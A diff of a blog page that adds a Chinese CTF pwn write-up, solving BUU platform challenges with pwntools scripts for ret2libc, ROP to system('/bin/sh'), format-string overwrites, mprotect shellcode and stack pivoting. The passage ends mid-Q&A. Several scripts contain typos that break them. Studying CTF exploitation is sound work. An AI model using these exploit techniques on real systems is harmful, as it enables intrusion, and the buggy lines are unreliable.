@@ -150,7 +150,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -161,7 +161,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags">
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -178,6 +178,473 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Li1x">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Li1x's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Li1x's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/" class="post-title-link" itemprop="url">BUU平台的做题记录</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-03-26 01:59:06 / Modified: 02:09:50" itemprop="dateCreated datePublished" datetime="2024-03-26T01:59:06+08:00">2024-03-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="CTF/Pwn/BUU刷题/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>8.2k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>15 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><h4 id="64位泄露ret2libc"><a href="#64位泄露ret2libc" class="headerlink" title="-&gt;64位泄露ret2libc"></a>-&gt;64位泄露ret2libc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 思路：利用ret2libc泄露地址，从而达到system(&quot;bin/sh&quot;)</span></span><br><span class="line"><span class="comment"># 0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004006b9 : ret</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25216</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;Input your choice!\n&#x27;,True)</span></span><br><span class="line"><span class="comment"># r.sendline(b&#x27;1&#x27;)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># 不满足8位的用0补齐</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr) <span class="comment"># 利用LibcSearcher模块找到libc的版本 [libc6_2.27-3ubuntu1_amd64]</span></span><br><span class="line">offest = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment"># 算偏移量</span></span><br><span class="line">binsh = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment"># 任一函数地址 = 偏移量 + libc中对应函数的地址</span></span><br><span class="line">system = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>-&gt;32位 ret2libc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Libc泄露：通过什么函数来泄露？ 找到这个函数之后，elf.got elf.plt , </span></span><br><span class="line"><span class="comment"># Libc泄露：通过write函数来泄露。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29598</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0</span>) + p32(write_pot) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#选择 libc6-i386_2.27-3ubuntu1_amd64 这个libc版本</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>checksec一下：</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/01.png"></p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/00.png"></p>
+<p><strong>可知将var[13]赋值一个17(0x11)就可以得到shell</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>但是这个payload并没有打通。</p>
+<p><strong>这里有个知识点:</strong></p>
+<blockquote>
+<p>qword全称是Quad Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以它自然是word（2字节，0~2^16-1）的四倍，8字节</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p64(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>学习：32位和64位传参的区别</p>
+<p><strong>32位：</strong>直接将参数放在栈中</p>
+<p><strong>64位：</strong>前六个参数放在寄存器中（rdi rsi rdx rcx r8 r9），如果还有参数，那再依次放入栈中</p>
+<p><strong>题解：</strong></p>
+<p>这个题是64位程序，在ida中打开，发现有栈溢出漏洞（vulnerable_function函数中）</p>
+<p><code>Shift + F12</code> 可以看到有<code>system</code>函数和 <code>/bin/sh</code>字符串</p>
+<p>-&gt; 先覆盖buf和rbp</p>
+<p>-&gt; 然后是 pop rdi ret &#x3D;&gt; 将栈顶元素（binsh字符串的地址）弹入rdi寄存器中，并且返回到下一指令处</p>
+<p>-&gt; 然后是返回到system()的地址</p>
+<p>-&gt; 参数就是rdi寄存器中的 binsh字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span><span class="number">26999</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">rdi_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span> + <span class="number">0x08</span>) + p64(rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>rdi的地址这样找：</p>
+<p><code>ROPgadget --binary level2_x64 --only &#39;pop|ret&#39;</code></p>
+</blockquote>
+<h2 id="not-the-same-3dsctf-2016-静态-32位"><a href="#not-the-same-3dsctf-2016-静态-32位" class="headerlink" title="not_the_same_3dsctf_2016[静态 32位]"></a>not_the_same_3dsctf_2016[静态 32位]</h2><p><code>ctrl + x</code> 查看调用字符串的位置</p>
+<p><code>ctrl + s</code>调出程序的段表，</p>
+<p><code>mprotect(void *addr, size_t len, int prot)函数</code></p>
+<p>-&gt; addr 内存启始地址；len 修改内存的长度；prot 内存的权限</p>
+<p>-&gt; 将.got.plt段改写为可读可写可执行的</p>
+<p><strong>肯定有人疑问了为什么是0x80EB000而不是bss段的开头0x80EBF80，因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25763</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(<span class="built_in">len</span>(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>checksec一下 32位 有NX保护（栈不可执行），canary保护（会放入一个值，在返回的时候会进行检查，得保证这个值没变）</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/02.png"></p>
+<p>偏移量的计算 10 &#x3D;&gt; 我们输入的数据是从第十个开始的</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/03.png"></p>
+<p>A的ascii值是65 &#x3D;&gt; 对应十六进制的0x41             a的ascii值是97 &#x3D;&gt; 对应十六进制的0x61</p>
+<p>程序要求我们输入的值与随机数相等，才可以执行<code>system(&#39;bin/sh&#39;)</code></p>
+<p>&#x3D;&gt; 由于存在格式化字符串漏洞</p>
+<p>我们可以通过<code>%n</code> 来修改储存随机数的地址的值</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/04.png"></p>
+<p>随机数起始地址是在 0x804c044 由于随机数是四位 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26680</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + p32(<span class="number">0x804c045</span>) + p32(<span class="number">0x804c046</span>) + p32(<span class="number">0x804c047</span>)</span><br><span class="line">payload += <span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>给Bss赋值，使得NX不可执行变为可执行 &#x3D;&gt; 构建shellcode</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(const void <span class="emphasis">*start, size_t len, int prot);</span></span><br><span class="line"><span class="emphasis">	第一个参数填的是一个地址，是指需要进行操作的地址。</span></span><br><span class="line"><span class="emphasis">	第二个参数是地址往后多大的长度。</span></span><br><span class="line"><span class="emphasis">	第三个参数的是要赋予的权限。</span></span><br><span class="line"><span class="emphasis">mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</span></span><br><span class="line"><span class="emphasis">prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</span></span><br><span class="line"><span class="emphasis">　　1）PROT_READ：表示内存段内的内容可写；</span></span><br><span class="line"><span class="emphasis">　　2）PROT_WRITE：表示内存段内的内容可读；</span></span><br><span class="line"><span class="emphasis">　　3）PROT_EXEC：表示内存段中的内容可执行；</span></span><br><span class="line"><span class="emphasis">　　4）PROT_NONE：表示内存段中的内容根本没法访问。</span></span><br><span class="line"><span class="emphasis">prot=7表示可读可写可执行，将它类比于chmod中的7</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="HDCTF-2023-KEEP-ON"><a href="#HDCTF-2023-KEEP-ON" class="headerlink" title="[HDCTF 2023]KEEP ON"></a>[HDCTF 2023]KEEP ON</h3><p><strong>知识点：格式化字符串劫持、<a target="_blank" rel="noopener" href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移</a></strong></p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/10.png"></p>
+<p><strong>法1,格式化字符串劫持(将printf_got 改成 system_plt)</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;,arch=&quot;i386&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28014</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./../pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  <span class="comment"># 寻找got表中printf的地址</span></span><br><span class="line"></span><br><span class="line">system_glt = elf.glt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 寻找plt表中system的地址</span></span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)  <span class="comment"># fmtstr_payload:got表劫持函数, 6是对应格式化字符串位置的索引，后面将printf的地址改成system的</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)   <span class="comment"># \n 是换行的意思.</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)	<span class="comment"># 这里发送是为了将printf_got 改成 system_plt =&gt; 以后调用printf函数就相当于调用system</span></span><br><span class="line"></span><br><span class="line">vulnaddr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep on !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)   <span class="comment"># 这里必须用send --&gt; 因为这里的read写入0x60(溢出16字节)0x08和vuln的地址就是16字节了,sendline后面跟有换行符</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>寻找偏移量 找 616161在第几位 </p>
+<p>​	-&gt; 我们输入的是aaaa 0x61(十六进制 -&gt; ascii的97)即a</p>
+</blockquote>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/11.png"></p>
+<p><strong>法2,栈迁移,可以先阅读前面的那个文章</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary hdctf --only &quot;pop|ret&quot;  0x00000000004008d3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary hdctf | grep leave   0x00000000004007f2 : leave ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%16$p&#x27;</span>)  <span class="comment"># 获得 old_rbp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello,0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_rbp = <span class="built_in">int</span>(io.recvunitl(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr = old_rbp - <span class="number">0x60</span> - <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008d3</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(target_addr + <span class="number">0x20</span>) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;keep on !&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Q&amp;A（个人理解）</p>
+<p><code>%16$p是哪来的</code></p>
+<p>-&gt;可以用过gdb动态调试得到old_rbp的具体值,然后通过尽量多的%p来泄露出具体位置</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/12.png"></p>
+<p><code>0x60是哪里来的?</code></p>
